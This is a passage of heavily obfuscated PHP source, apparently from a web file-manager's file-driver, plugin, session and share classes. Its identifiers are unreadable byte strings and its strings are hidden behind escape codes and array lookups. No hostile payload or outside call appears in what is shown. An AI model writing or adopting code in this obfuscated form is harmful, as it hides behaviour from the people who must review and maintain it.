$ÓâÔøı´[$û‰ö©®ô[33]] = $û‰ö©®ô[79]; } return $ÓâÔøı´; } protected function _isFolder($É”Êïœ) { $âŒÓ²ö =& $_SERVER[Æ š¦İÈ]; if ($É”Êïœ == $âŒÓ²ö[12] || $É”Êïœ == $âŒÓ²ö[8]) { return !0; } $Õí¦Â³Å = $this->_objectMeta($É”Êïœ); return isset($Õí¦Â³Å[$âŒÓ²ö[33]]) && $Õí¦Â³Å[$âŒÓ²ö[33]] == $âŒÓ²ö[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($çİğÍĞè) { if (substr($çİğÍĞè, 0, 2) == $_SERVER[Æ š¦İÈ][1356]) { $çİğÍĞè = BASIC_PATH . substr($çİğÍĞè, 2); } return $çİğÍĞè; } public function iconvApp($ˆÑÉ„Œ) { $ ·™À =& $_SERVER[Æ š¦İÈ]; global $config; return $this->iconvTo($ˆÑÉ„Œ, $config[$ ·™À[1354]], $config[$ ·™À[1353]]); } public function iconvSystem($ÀÏÉ‡) { $›³˜ãÇĞ =& $_SERVER[Æ š¦İÈ]; global $config; return $this->iconvTo($ÀÏÉ‡, $config[$›³˜ãÇĞ[1353]], $config[$›³˜ãÇĞ[1354]]); } public function getPathOuter($Û×ŸÚ¶ ) { $™ëó³×È =& $_SERVER[Æ š¦İÈ]; $—‚‚°¬œ = $this->iconvApp($this->pathBase); $Û×ŸÚ¶  = $this->iconvApp($Û×ŸÚ¶ ); if (substr($—‚‚°¬œ, 0, 2) == $™ëó³×È[1356]) { $—‚‚°¬œ = BASIC_PATH . substr($—‚‚°¬œ, 2); } if (substr($Û×ŸÚ¶ , 0, 2) == $™ëó³×È[1356]) { $Û×ŸÚ¶  = BASIC_PATH . substr($Û×ŸÚ¶ , 2); } $—‚‚°¬œ = KodIO::clear($—‚‚°¬œ); $Û×ŸÚ¶  = KodIO::clear($Û×ŸÚ¶ ); $Û×ŸÚ¶  = substr($Û×ŸÚ¶ , strlen($—‚‚°¬œ)); if (empty($this->pathDriver)) { return $Û×ŸÚ¶ ; } return $this->pathDriver . $™ëó³×È[8] . ltrim($Û×ŸÚ¶ , $™ëó³×È[8]); } public function mkfile($ö÷èú˜œ, $÷¢ï·¬Ÿ = '', $ÆğâåÇô = REPEAT_RENAME) { $ö÷èú˜œ = $this->iconvSystem($ö÷èú˜œ); @touch($ö÷èú˜œ); if ($÷¢ï·¬Ÿ) { file_put_contents($ö÷èú˜œ, $÷¢ï·¬Ÿ); } @chmod($ö÷èú˜œ, $this->pathAuth); return is_file($ö÷èú˜œ) ? $this->getPathOuter($ö÷èú˜œ) : !1; } public function mkdir($Ù›Ş¢úÇ, $ŸÀÜæç = REPEAT_SKIP) { $Ù›Ş¢úÇ = $this->iconvSystem($Ù›Ş¢úÇ); if (is_dir($Ù›Ş¢úÇ)) { return $this->getPathOuter($Ù›Ş¢úÇ); } @mkdir($Ù›Ş¢úÇ, $this->pathAuth, !0); @chmod($Ù›Ş¢úÇ, $this->pathAuth); return is_dir($Ù›Ş¢úÇ) ? $this->getPathOuter($Ù›Ş¢úÇ) : !1; } public function copyFile($Ü´‰àĞù, $üá—€óÓ) { $this->mkdir($this->pathFather($üá—€óÓ)); $Ü´‰àĞù = $this->iconvSystem($Ü´‰àĞù); $üá—€óÓ = $this->iconvSystem($üá—€óÓ); $Ÿ¨®Ù·Ï = copy_64($Ü´‰àĞù, $üá—€óÓ); @chmod($üá—€óÓ, $this->pathAuth); return $Ÿ¨®Ù·Ï ? $this->getPathOuter($üá—€óÓ) : !1; } public function moveFile($ÏïÎ¼§—, $³£ß­¹¹) { $this->mkdir($this->pathFather($³£ß­¹¹)); $ÏïÎ¼§— = $this->iconvSystem($ÏïÎ¼§—); $³£ß­¹¹ = $this->iconvSystem($³£ß­¹¹); $êıüĞÕ = intval(@rename($ÏïÎ¼§—, $³£ß­¹¹)); if (!$êıüĞÕ) { if ($êıüĞÕ = intval(@copy_64($ÏïÎ¼§—, $³£ß­¹¹))) { @unlink($ÏïÎ¼§—); } } @chmod($³£ß­¹¹, $this->pathAuth); return $êıüĞÕ ? $this->getPathOuter($³£ß­¹¹) : !1; } public function movePath($ß°­¥Œú, $øÔÑ×Óá, $×¡×ô÷€ = false) { $ƒ—ßØ =& $_SERVER[Æ š¦İÈ]; $ß°­¥Œú = $this->iconvSystem($ß°­¥Œú); $øÔÑ×Óá = $this->iconvSystem($øÔÑ×Óá); $ßşÜˆÊ· = rtrim($øÔÑ×Óá, $ƒ—ßØ[8]) . $ƒ—ßØ[8] . ($×¡×ô÷€ ? $×¡×ô÷€ : get_path_this($ß°­¥Œú)); if (file_exists($ßşÜˆÊ·)) { return !1; } $¬ñÈÎ = intval(@rename($ß°­¥Œú, $ßşÜˆÊ·)); $¬ñÈÎ = file_exists($ßşÜˆÊ·); return $¬ñÈÎ ? $this->getPathOuter($ßşÜˆÊ·) : !1; } public function delFile($òÖ•ü¶‹) { $òÖ•ü¶‹ = $this->iconvSystem($òÖ•ü¶‹); if (!@unlink($òÖ•ü¶‹)) { @chmod($òÖ•ü¶‹, $this->pathAuth); if (!@unlink($òÖ•ü¶‹)) { return !1; } } else { return !0; } } public function delFolder($“êÇ©Áõ) { $á×§¼İÁ =& $_SERVER[Æ š¦İÈ]; $“êÇ©Áõ = $this->iconvSystem($“êÇ©Áõ); if (!is_dir($“êÇ©Áõ)) { return !0; } if (!($×…ƒŠàé = opendir($“êÇ©Áõ))) { return !1; } while (($ûÚê•– = readdir($×…ƒŠàé)) !== !1) { if ($ûÚê•– == $á×§¼İÁ[10] || $ûÚê•– == $á×§¼İÁ[1363]) { continue; } $ÒÆí€åÃ = $“êÇ©Áõ . $á×§¼İÁ[8] . $ûÚê•–; if (is_file($ÒÆí€åÃ) || is_link($ÒÆí€åÃ)) { if (!unlink($ÒÆí€åÃ)) { chmod($ÒÆí€åÃ, $this->pathAuth); if (!unlink($ÒÆí€åÃ)) { return !1; } } } else { if (is_dir($ÒÆí€åÃ)) { chmod($ÒÆí€åÃ, $this->pathAuth); $ÒÆí€åÃ = $this->iconvApp($ÒÆí€åÃ); if (!$this->delFolder($ÒÆí€åÃ)) { return !1; } } } } closedir($×…ƒŠàé); return rmdir($“êÇ©Áõ); } public function rename($«ÊëÔ, $“Ú†´şà) { $¤á£¼šõ =& $_SERVER[Æ š¦İÈ]; $¿¯ù¼¼ = $this->fileNameAuto($this->pathFather($«ÊëÔ), $“Ú†´şà); $¿¯ù¼¼ = $this->iconvSystem($¿¯ù¼¼); $«ÊëÔ = $this->iconvSystem($«ÊëÔ); $Í«äÃÔ = $this->pathFather($«ÊëÔ); $š®Øû—è = rtrim($Í«äÃÔ, $¤á£¼šõ[8]) . $¤á£¼šõ[8] . $¿¯ù¼¼; $ŒøÕ‚üş = @rename($«ÊëÔ, $š®Øû—è); $š®Øû—è = $this->iconvApp($š®Øû—è); return $ŒøÕ‚üş ? $this->getPathOuter($š®Øû—è) : !1; } public function size($Ú‘ÀÇšã) { $Ú‘ÀÇšã = $this->iconvSystem($Ú‘ÀÇšã); return filesize_64($Ú‘ÀÇšã); } public function info($¡™½ÂÌ) { $¡™½ÂÌ = $this->iconvSystem($¡™½ÂÌ); if ($this->isFolder($¡™½ÂÌ)) { return $this->folderInfo($¡™½ÂÌ); } else { if ($this->isFile($¡™½ÂÌ)) { return $this->fileInfo($¡™½ÂÌ); } } return !1; } protected function infoChildren($ß·¹·‚, &$¾æ§Ô, $ªé˜¯ÙØ = true) { $İ±‘Ø® =& $_SERVER[Æ š¦İÈ]; check_abort_echo(); $ß·¹·‚ = rtrim($ß·¹·‚, $İ±‘Ø®[8]) . $İ±‘Ø®[8]; if ($ªé˜¯ÙØ) { $ß·¹·‚ = $this->iconvSystem($ß·¹·‚); } if (!($èÉˆº—… = @opendir($ß·¹·‚))) { return; } while (($›©´„¾± = readdir($èÉˆº—…)) !== !1) { if ($›©´„¾± == $İ±‘Ø®[10] || $›©´„¾± == $İ±‘Ø®[1363]) { continue; } $íË…«ˆ¡ = $ß·¹·‚ . $›©´„¾±; if (is_file($íË…«ˆ¡) || is_link($íË…«ˆ¡)) { $¾æ§Ô[$İ±‘Ø®[81]]++; $¾æ§Ô[$İ±‘Ø®[80]] += filesize_64($íË…«ˆ¡); } else { if (is_dir($íË…«ˆ¡)) { $¾æ§Ô[$İ±‘Ø®[82]]++; $this->infoChildren($íË…«ˆ¡, $¾æ§Ô, !1); } } } closedir($èÉˆº—…); } private function folderInfo($›â˜¼Ò, $Õâ‘–õø = false) { $ˆ›Ï’Âñ =& $_SERVER[Æ š¦İÈ]; $›â˜¼Ò = rtrim($›â˜¼Ò, $ˆ›Ï’Âñ[8]) . $ˆ›Ï’Âñ[8]; $ÅÒ¤Ñ–™ = $this->iconvApp($this->pathThis($›â˜¼Ò)); if ($Õâ‘–õø) { return array($ˆ›Ï’Âñ[32] => $ÅÒ¤Ñ–™, $ˆ›Ï’Âñ[78] => $this->getPathOuter($›â˜¼Ò), $ˆ›Ï’Âñ[33] => $ˆ›Ï’Âñ[79]); } $Á÷ÅÆÕ = array($ˆ›Ï’Âñ[32] => $ÅÒ¤Ñ–™, $ˆ›Ï’Âñ[78] => $this->getPathOuter($›â˜¼Ò), $ˆ›Ï’Âñ[33] => $ˆ›Ï’Âñ[79], $ˆ›Ï’Âñ[195] => @filectime($›â˜¼Ò), $ˆ›Ï’Âñ[86] => @filemtime($›â˜¼Ò), $ˆ›Ï’Âñ[1366] => @fileatime($›â˜¼Ò), $ˆ›Ï’Âñ[1367] => is_readable($›â˜¼Ò), $ˆ›Ï’Âñ[1368] => is_writable($›â˜¼Ò), $ˆ›Ï’Âñ[1369] => get_mode($›â˜¼Ò)); return $Á÷ÅÆÕ; } private function fileInfo($ÚªùÚƒÁ, $ÁœğÚ‹õ = false) { $ŠŞÖ—Ñà =& $_SERVER[Æ š¦İÈ]; $´Éæ¢¡ã = $this->iconvApp($this->pathThis($ÚªùÚƒÁ)); if ($ÁœğÚ‹õ) { return array($ŠŞÖ—Ñà[32] => $´Éæ¢¡ã, $ŠŞÖ—Ñà[78] => $this->getPathOuter($ÚªùÚƒÁ), $ŠŞÖ—Ñà[33] => $ŠŞÖ—Ñà[194], $ŠŞÖ—Ñà[80] => $this->size($ÚªùÚƒÁ), $ŠŞÖ—Ñà[169] => $this->ext($´Éæ¢¡ã)); } $¶‹áªí = array($ŠŞÖ—Ñà[32] => $´Éæ¢¡ã, $ŠŞÖ—Ñà[78] => $this->getPathOuter($ÚªùÚƒÁ), $ŠŞÖ—Ñà[33] => $ŠŞÖ—Ñà[194], $ŠŞÖ—Ñà[195] => @filectime($ÚªùÚƒÁ), $ŠŞÖ—Ñà[86] => @filemtime($ÚªùÚƒÁ), $ŠŞÖ—Ñà[1366] => @fileatime($ÚªùÚƒÁ), $ŠŞÖ—Ñà[80] => $this->size($ÚªùÚƒÁ), $ŠŞÖ—Ñà[169] => $this->ext($´Éæ¢¡ã), $ŠŞÖ—Ñà[1367] => is_readable($ÚªùÚƒÁ), $ŠŞÖ—Ñà[1368] => is_writable($ÚªùÚƒÁ), $ŠŞÖ—Ñà[1369] => get_mode($ÚªùÚƒÁ)); return $¶‹áªí; } public function exist($îô¢°Ù) { $îô¢°Ù = $this->iconvSystem($îô¢°Ù); return @file_exists($îô¢°Ù); } public function isFile($°‹ôÎĞò) { $°‹ôÎĞò = $this->iconvSystem($°‹ôÎĞò); return @is_file($°‹ôÎĞò); } public function isFolder($Ã³âÙå) { $Ã³âÙå = $this->iconvSystem($Ã³âÙå); return @is_dir($Ã³âÙå); } public function listPath($ß†£©µ, $¬âÁ¹™† = false) { $ÆÌ¤Œà =& $_SERVER[Æ š¦İÈ]; $ß†£©µ = $this->iconvSystem($ß†£©µ); $ß†£©µ = rtrim($ß†£©µ, $ÆÌ¤Œà[8]) . $ÆÌ¤Œà[8]; $¥Ñ§Ã…ê = array($ÆÌ¤Œà[77] => array(), $ÆÌ¤Œà[76] => array()); if (!($©×¦Áòú = @opendir($ß†£©µ))) { return $¥Ñ§Ã…ê; } while (($åï‚¸ô = readdir($©×¦Áòú)) !== !1) { if ($åï‚¸ô == $ÆÌ¤Œà[10] || $åï‚¸ô == $ÆÌ¤Œà[1363]) { continue; } $ûìëÙğ× = $ß†£©µ . $åï‚¸ô; if (is_file($ûìëÙğ×)) { $¥Ñ§Ã…ê[$ÆÌ¤Œà[76]][] = $this->fileInfo($ûìëÙğ×, $¬âÁ¹™†); } else { $¥Ñ§Ã…ê[$ÆÌ¤Œà[77]][] = $this->folderInfo($ûìëÙğ×, $¬âÁ¹™†); } } closedir($©×¦Áòú); return $¥Ñ§Ã…ê; } public function listAll($¨ ê²š, &$²¿°€´Œ = array()) { $ğÓşª¡Å =& $_SERVER[Æ š¦İÈ]; $¨ ê²š = $this->iconvSystem($¨ ê²š); $¨ ê²š = rtrim($¨ ê²š, $ğÓşª¡Å[8]) . $ğÓşª¡Å[8]; if (!($…Î€ÁøØ = @opendir($¨ ê²š))) { return $²¿°€´Œ; } while (($–»¶’î = readdir($…Î€ÁøØ)) !== !1) { if ($–»¶’î == $ğÓşª¡Å[10] || $–»¶’î == $ğÓşª¡Å[1363]) { continue; } $ä¤¿ö› = $¨ ê²š . $–»¶’î; if (is_dir($ä¤¿ö›) && !is_link($ä¤¿ö›)) { $²¿°€´Œ[] = array($ğÓşª¡Å[78] => $ä¤¿ö› . $ğÓşª¡Å[8], $ğÓşª¡Å[79] => 1, $ğÓşª¡Å[86] => @filemtime($ä¤¿ö›), $ğÓşª¡Å[80] => 0); $this->listAll($ä¤¿ö›, $²¿°€´Œ); } else { $²¿°€´Œ[] = array($ğÓşª¡Å[78] => $ä¤¿ö›, $ğÓşª¡Å[79] => 0, $ğÓşª¡Å[86] => @filemtime($ä¤¿ö›), $ğÓşª¡Å[80] => $this->size($ä¤¿ö›)); } } closedir($…Î€ÁøØ); return $²¿°€´Œ; } public function has($Ì€×ı¶, $ôå©Äî• = false, $ÍŞ‚êì = true) { $½ş«’Ö =& $_SERVER[Æ š¦İÈ]; $Ì€×ı¶ = $this->iconvSystem($Ì€×ı¶); $Ì€×ı¶ = rtrim($Ì€×ı¶, $½ş«’Ö[8]) . $½ş«’Ö[8]; if (!($ªÆµ°¼ = @opendir($Ì€×ı¶))) { return !1; } $Ìä—€³å = 0; $Œ•¢ûš¿ = 0; $–ÚŞå“Ö = 0; while (($Üè«Ø¨È = readdir($ªÆµ°¼)) !== !1) { if ($Üè«Ø¨È == $½ş«’Ö[10] || $Üè«Ø¨È == $½ş«’Ö[1363]) { continue; } $¶Íõù÷ä = $Ì€×ı¶ . $Üè«Ø¨È; if ($ôå©Äî•) { $–ÚŞå“Ö++; if (@is_file($¶Íõù÷ä)) { $Ìä—€³å++; } else { $Œ•¢ûš¿++; } if ($–ÚŞå“Ö > 10000) { break; } continue; } if ($ÍŞ‚êì) { if (@is_file($¶Íõù÷ä)) { return !0; } } else { if (@is_dir($¶Íõù÷ä . $½ş«’Ö[8])) { return !0; } } } closedir($ªÆµ°¼); if ($ôå©Äî•) { return array($½ş«’Ö[204] => $Ìä—€³å, $½ş«’Ö[205] => $Œ•¢ûš¿); } return !1; } public function hashSimple($Ğ¬ü¶ïû) { $¤ÜÈ¾Û =& $_SERVER[Æ š¦İÈ]; if (!$Ğ¬ü¶ïû) { return md5($¤ÜÈ¾Û[12]); } $Ğ¬ü¶ïû = $this->iconvSystem($Ğ¬ü¶ïû); $Ÿß£Ï»™ = $this->size($Ğ¬ü¶ïû); $‘œöº‚ñ = 200; $‹•á„‰» = 50; if ($Ÿß£Ï»™ <= $‘œöº‚ñ * $‹•á„‰») { return $this->hashMd5($Ğ¬ü¶ïû) . $Ÿß£Ï»™; } $¯˜é°¯™ = $¤ÜÈ¾Û[12]; $ÑºõÀúÒ = intval($Ÿß£Ï»™ / $‹•á„‰»); $‰à¢åßñ = fopen($Ğ¬ü¶ïû, $¤ÜÈ¾Û[1370]); if (!$‰à¢åßñ) { return $¯˜é°¯™; } for ($ó“¨˜­‚ = 0; $ó“¨˜­‚ < $‹•á„‰»; $ó“¨˜­‚++) { fseek_64($‰à¢åßñ, $ÑºõÀúÒ * $ó“¨˜­‚); $¯˜é°¯™ .= fread($‰à¢åßñ, $‘œöº‚ñ); } fseek_64($‰à¢åßñ, $Ÿß£Ï»™ - $‘œöº‚ñ); $¯˜é°¯™ .= fread($‰à¢åßñ, $‘œöº‚ñ); fclose($‰à¢åßñ); return md5($¯˜é°¯™) . $Ÿß£Ï»™; } public function getContent($»Øí££–) { $»Øí££– = $this->iconvSystem($»Øí££–); return file_get_contents($»Øí££–); } public function setContent($í­ä£¤Ë, $Ãêµä¶ = '') { $í­ä£¤Ë = $this->iconvSystem($í­ä£¤Ë); $„—ê€ = @file_put_contents($í­ä£¤Ë, $Ãêµä¶, LOCK_EX); clearstatcache(); @chmod($í­ä£¤Ë, $this->pathAuth); return $„—ê€ === !1 ? !1 : !0; } public function fileSubstr($ÆĞ•óäõ, $ˆï¦û¶Ş = 0, $‘¥÷ÆøÅ = false) { $¥ªòÆÖÀ =& $_SERVER[Æ š¦İÈ]; $ÆĞ•óäõ = $this->iconvSystem($ÆĞ•óäõ); if ($‘¥÷ÆøÅ === !1) { $‘¥÷ÆøÅ = $this->size($ÆĞ•óäõ); } if ($‘¥÷ÆøÅ <= 0) { return $¥ªòÆÖÀ[12]; } $ó—¾½»˜ = fopen($ÆĞ•óäõ, $¥ªòÆÖÀ[1370]); if (!$ó—¾½»˜) { return !1; } fseek_64($ó—¾½»˜, $ˆï¦û¶Ş); $ºßßşÎí = fread($ó—¾½»˜, $‘¥÷ÆøÅ); fclose($ó—¾½»˜); return $ºßßşÎí; } public function upload($·„–úÍ, $Å¯¾Û“î, $ĞÉá›¯® = false, $¯ä·€Ğ = REPEAT_REPLACE) { if ($ĞÉá›¯®) { return $this->moveFile($Å¯¾Û“î, $·„–úÍ); } return $this->copyFile($Å¯¾Û“î, $·„–úÍ); } public function setModifyTime($ñĞ¿¹¿¹, $ôõ°ú™à = '') { @touch($ñĞ¿¹¿¹, intval($ôõ°ú™à)); } public function download($Éè‚õëÓ, $¦ †ê‚ç) { return $this->iconvSystem($Éè‚õëÓ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($æ”ß¾şı) { parent::__construct($æ”ß¾şı); $this->signatureVersion($_SERVER[Æ š¦İÈ][213]); } public function fileOutLink($İ‹¥£Ó“) { $£ß»Œ¦ =& $_SERVER[Æ š¦İÈ]; if (substr($İ‹¥£Ó“, 0, 7) == $£ß»Œ¦[1314]) { $İ‹¥£Ó“ = $£ß»Œ¦[1315] . substr($İ‹¥£Ó“, 7); } header($£ß»Œ¦[160] . $İ‹¥£Ó“); die; } } goto aÚö‘”Ñ›‹; cì¯¹´¯”: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\160\154\x75\x67\x69\x6e\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\x61\x74\165\163", "\x72\x65\147\x69\145\163\164", "\143\x6f\x6e\146\x69\147"); public function loadList($‰–¦‰øå = false) { $â³ÂÓÀ = array_to_keyvalue($this->listData(), $_SERVER[Æ š¦İÈ][32]); if ($‰–¦‰øå) { return $â³ÂÓÀ[$‰–¦‰øå]; } return $â³ÂÓÀ; } public function init() { $ÅìÔå§† =& $_SERVER[Æ š¦İÈ]; Hook::trigger($ÅìÔå§†[1929]); $ı¥Úø¾ = $this->loadPluginList(); foreach ($ı¥Úø¾ as $ë†÷¹œ => $ÙÒ‡úÚƒ) { $ò€ú§Æ = $this->appAllow($ë†÷¹œ, $ÙÒ‡úÚƒ); if (!$ò€ú§Æ) { continue; } foreach ($ÙÒ‡úÚƒ[$ÅìÔå§†[1930]] as $ÖÜ¦ÎÄå => $ĞâÁƒñŞ) { Hook::bind($ÖÜ¦ÎÄå, $ĞâÁƒñŞ); } } Hook::trigger($ÅìÔå§†[1931]); Hook::trigger(ACTION); } public function appAllow($ô†‡í£‹, $¯¹É‘ÚÅ, $¢Ì­½ = true) { $÷›Ó„…Ğ =& $_SERVER[Æ š¦İÈ]; $„Íˆ‹à´ = PLUGIN_DIR . $ô†‡í£‹ . $÷›Ó„…Ğ[1932]; if (!is_array($¯¹É‘ÚÅ) || !is_array($¯¹É‘ÚÅ[$÷›Ó„…Ğ[1930]]) || $¯¹É‘ÚÅ[$÷›Ó„…Ğ[747]] != 1 || !is_file($„Íˆ‹à´)) { return !1; } if ($GLOBALS[$÷›Ó„…Ğ[507]] == 1) { return !0; } if ($¢Ì­½ && !Action($÷›Ó„…Ğ[1933])->checkAuth($ô†‡í£‹)) { return !1; } return !0; } public function unInstall($ü°Û…½é) { $·²¹Ä™ò =& $_SERVER[Æ š¦İÈ]; $Ñ¾¶ÜçÃ = $this->loadList($ü°Û…½é); if (file_exists(PLUGIN_DIR . $ü°Û…½é)) { Hook::apply($ü°Û…½é . $·²¹Ä™ò[1934]); } $this->remove($Ñ¾¶ÜçÃ[$·²¹Ä™ò[403]]); } public function changeStatus($¿Ğº şÙ, $Á»õ„€ä) { $Øé«¸Õå =& $_SERVER[Æ š¦İÈ]; $òè­í€İ = $this->loadList($¿Ğº şÙ); if ($Á»õ„€ä) { Hook::apply($¿Ğº şÙ . $Øé«¸Õå[1935]); } $this->update($òè­í€İ[$Øé«¸Õå[403]], array($Øé«¸Õå[1936] => $Á»õ„€ä)); } public function appRegist($†Ûš¹ş», $©Ò„–ïš) { $¥¤õ¸å =& $_SERVER[Æ š¦İÈ]; $¸™ºÚÓ = $this->loadList($†Ûš¹ş»); if ($¸™ºÚÓ) { $this->update($¸™ºÚÓ[$¥¤õ¸å[403]], array($¥¤õ¸å[1930] => $©Ò„–ïš)); } else { $È¨ˆªú‰ = array($¥¤õ¸å[32] => $†Ûš¹ş», $¥¤õ¸å[1930] => $©Ò„–ïš, $¥¤õ¸å[747] => 0, $¥¤õ¸å[6] => $this->getConfigDefault($†Ûš¹ş»)); $this->insert($È¨ˆªú‰); } } public function getConfigDefault($ÍÈà‡Ô) { $ğ²ô“ş® =& $_SERVER[Æ š¦İÈ]; $ò³å‹÷ = array(); $¯°±×Ç¤ = $this->getPackageJson($ÍÈà‡Ô); if (!$¯°±×Ç¤ && is_array($¯°±×Ç¤[$ğ²ô“ş®[1937]])) { return $ò³å‹÷; } foreach ($¯°±×Ç¤[$ğ²ô“ş®[1937]] as $ß°Œ¦óæ => $Î‹îŠó) { if (!isset($Î‹îŠó[$ğ²ô“ş®[371]]) || isset($ò³å‹÷[$ß°Œ¦óæ])) { continue; } $ò³å‹÷[$ß°Œ¦óæ] = $Î‹îŠó[$ğ²ô“ş®[371]]; } return $ò³å‹÷; } public function getPackageJson($•ŠıùÍ¨) { return Hook::apply($•ŠıùÍ¨ . $_SERVER[Æ š¦İÈ][1938]); } public function getConfig($â¢²Ç®ı, $ßÕ×º¹ß = false) { $êğœÄ¢ =& $_SERVER[Æ š¦İÈ]; $¿‚© = array(); $Úñç­¥ˆ = $this->loadList($â¢²Ç®ı); if ($Úñç­¥ˆ && is_array($Úñç­¥ˆ[$êğœÄ¢[6]])) { $¿‚© = $Úñç­¥ˆ[$êğœÄ¢[6]]; } if (!$¿‚© || $ßÕ×º¹ß) { $¿‚© = $this->getConfigDefault($â¢²Ç®ı); } return $¿‚©; } public function setConfig($‚½Õõ…ş, $ûĞ”üÄó = false) { $´ÌõŒŠ¡ =& $_SERVER[Æ š¦İÈ]; $ŠÀÈˆ¦¿ = $this->loadList($‚½Õõ…ş); if (!$ŠÀÈˆ¦¿) { return !1; } $©ëéñĞ— = $ŠÀÈˆ¦¿[$´ÌõŒŠ¡[6]]; if ($ûĞ”üÄó == !1) { $©ëéñĞ— = array(); $ûĞ”üÄó = $this->getConfigDefault($‚½Õõ…ş); } foreach ($ûĞ”üÄó as $Œ›•ş·¡ => $‹÷ÌñÜû) { $©ëéñĞ—[$Œ›•ş·¡] = is_string($‹÷ÌñÜû) ? trim($‹÷ÌñÜû) : $‹÷ÌñÜû; } $this->update($ŠÀÈˆ¦¿[$´ÌõŒŠ¡[403]], array($´ÌõŒŠ¡[6] => $©ëéñĞ—)); } public function viewList() { $­¾û·©´ =& $_SERVER[Æ š¦İÈ]; $Æ•©Íå = $this->loadList(); $this->pluginScan($Æ•©Íå); $Æ•©Íå = $this->loadPluginList(); $ïÕïé = array(); foreach ($Æ•©Íå as $‹äô¦ó => $Á»ì§¿ı) { unset($Á»ì§¿ı[$­¾û·©´[1930]], $Á»ì§¿ı[$­¾û·©´[6]]); $È¾»ğÔ… = PLUGIN_DIR . $Á»ì§¿ı[$­¾û·©´[32]] . $­¾û·©´[1932]; if (!is_file($È¾»ğÔ…)) { continue; } $¦Ö¨¼ƒå = Hook::apply($Á»ì§¿ı[$­¾û·©´[32]] . $­¾û·©´[1938]); if (is_array($¦Ö¨¼ƒå)) { $ïÕïé[$‹äô¦ó] = array_merge($Á»ì§¿ı, $¦Ö¨¼ƒå); } } return $ïÕïé; } private function loadPluginList() { $è·ùûÂœ =& $_SERVER[Æ š¦İÈ]; $ˆ‚ÀèÛÂ = $this->loadList(); if (strtolower(MOD) == $è·ùûÂœ[1939]) { return $ˆ‚ÀèÛÂ; } $‚ÛŞÆš = Hook::trigger($è·ùûÂœ[1940], $ˆ‚ÀèÛÂ); if ($ˆ‚ÀèÛÂ && !$‚ÛŞÆš) { die; } return $‚ÛŞÆš ? $‚ÛŞÆš : $ˆ‚ÀèÛÂ; } private function pluginScan($»­èÂŞâ) { $„·Ë™§ù =& $_SERVER[Æ š¦İÈ]; recursion_dir(PLUGIN_DIR, $Ü·äá™™, $«äğ–Œ, 0); foreach ($Ü·äá™™ as $ùÍê°Ò ) { $Í±ûˆÚæ = get_path_this($ùÍê°Ò ); if (isset($»­èÂŞâ[$Í±ûˆÚæ]) || !file_exists($ùÍê°Ò  . $„·Ë™§ù[1941]) || !file_exists($ùÍê°Ò  . $„·Ë™§ù[1932])) { continue; } Hook::apply($Í±ûˆÚæ . $„·Ë™§ù[1935]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\x6d\137\x73\145\x73\x73\151\157\156"; public function get($Ü¡ªã¥Â) { $«Ö¾¬Ä =& $_SERVER[Æ š¦İÈ]; $Ÿ´ÌÈ = $this->where(array($«Ö¾¬Ä[1942] => $Ü¡ªã¥Â))->find(); if (!is_array($Ÿ´ÌÈ)) { return !1; } return $Ÿ´ÌÈ[$«Ö¾¬Ä[752]]; } public function set($¬Œßù¬ü, $Ğ­»š‹, $å¾¥¾Õ’ = 3600) { $ú¢‹à×æ =& $_SERVER[Æ š¦İÈ]; $á•Ë = array($ú¢‹à×æ[1942] => $¬Œßù¬ü, $ú¢‹à×æ[1850] => $Ğ­»š‹, $ú¢‹à×æ[1943] => $å¾¥¾Õ’ + time()); if (Session::get($ú¢‹à×æ[1944])) { $á•Ë[$ú¢‹à×æ[1644]] = Session::get($ú¢‹à×æ[1944]); } else { $á•Ë[$ú¢‹à×æ[1644]] = 0; } if ($this->get($¬Œßù¬ü)) { return $this->where(array($ú¢‹à×æ[1942] => $¬Œßù¬ü))->save($á•Ë); } else { return $this->add($á•Ë, array(), !0); } } public function remove($ğŒœÅªï) { return $this->where(array($_SERVER[Æ š¦İÈ][1942] => $ğŒœÅªï))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Æ š¦İÈ][1945] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\124\151\x6d\145", "\x74\x69\155\145", "\151\156\163\145\162\x74\x2c\x75\160\x64\141\164\x65", "\146\165\156\143\164\151\157\156"), array("\143\162\x65\141\x74\x65\124\x69\155\145", "\164\x69\155\x65", "\x69\156\x73\145\x72\164", "\x66\x75\x6e\143\164\151\x6f\156"), array("\157\160\164\151\x6f\156\x73", '', "\x69\x6e\x73\x65\162\x74\54\165\160\x64\141\164\145\54\163\x65\154\145\x63\x74", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¡¡‘µïœ) { $ÕÕ€áÌ =& $_SERVER[Æ š¦İÈ]; $ã‚³Ñí² = isset($¡¡‘µïœ[0]) ? $¡¡‘µïœ[0] : !1; return array($ÕÕ€áÌ[1946] => array(USER_ID, $ÕÕ€áÌ[1947]), $ÕÕ€áÌ[1891] => array($ã‚³Ñí², $ÕÕ€áÌ[1948])); } protected function listSimple() { $æ€şó¦£ = array($_SERVER[Æ š¦İÈ][1644] => USER_ID); $€ÛšÔ¥ = $this->field($this->fieldList)->where($æ€şó¦£)->select(); return $€ÛšÔ¥ ? $€ÛšÔ¥ : array(); } protected function getInfo($®çòƒ¼, $ù¸âÒü” = false) { $Ëı‘í¡ =& $_SERVER[Æ š¦İÈ]; if ($ù¸âÒü”) { return $this->_getShareInfo(array($Ëı‘í¡[490] => $®çòƒ¼)); } $¿ÄªÛû¢ = $this->cacheFunctionGet($Ëı‘í¡[1893], $®çòƒ¼); return $¿ÄªÛû¢; } public function getInfoByHash($‚éŸê¨) { return $this->_getShareInfo(array($_SERVER[Æ š¦İÈ][492] => $‚éŸê¨)); } public function getInfoByPath($Ïì…üé«) { $úûŸô­ò =& $_SERVER[Æ š¦İÈ]; $Ê¥İŒÓ³ = array($úûŸô­ò[1644] => USER_ID, $úûŸô­ò[405] => $Ïì…üé«); return $this->_getShareInfo($Ê¥İŒÓ³); } public function getInfoBySourcePath($Ùš´»Ñ) { $×ƒ€ÔñÃ =& $_SERVER[Æ 